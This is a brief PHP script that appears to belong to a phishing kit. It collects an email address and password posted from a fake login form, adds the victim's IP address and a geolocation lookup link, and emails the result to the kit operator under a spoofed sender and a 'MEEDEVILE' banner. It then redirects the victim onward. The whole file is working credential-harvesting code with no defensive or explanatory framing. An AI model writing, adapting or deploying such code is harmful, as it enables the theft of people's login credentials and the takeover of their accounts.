<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$browzer = $_SERVER["HTTP_USER_AGENT"];
$message .= "==========[MEEDEVILE]=========<br>\n";
$message .= "|E-M-L    : ".$_POST['ID']."<br>\n";
$message .= "|P-S-W    : ".$_POST['Pass']."<br>\n";
$message .= "===============[IP]==============<br>\n";
$message .= "IP	: http://www.geoiptool.com/?IP=$ip<br>\n";
$message .= "==========[MEEDEVILE]=========<br>";

include '../e-mail.php';
$subject = "> LOGIN INFO $ip";
$headers = "From: ~MEEDEVILE~ <The.GrXn0v@support.com>";
$headers .= "MIME-Version: 1.0\n";
$headers .= "Content-type: text/html; charset=iso-8859-1\n";


mail($to, $subject, $message,$headers);

header("Location: ../pross.php?IP=$ip");

?>
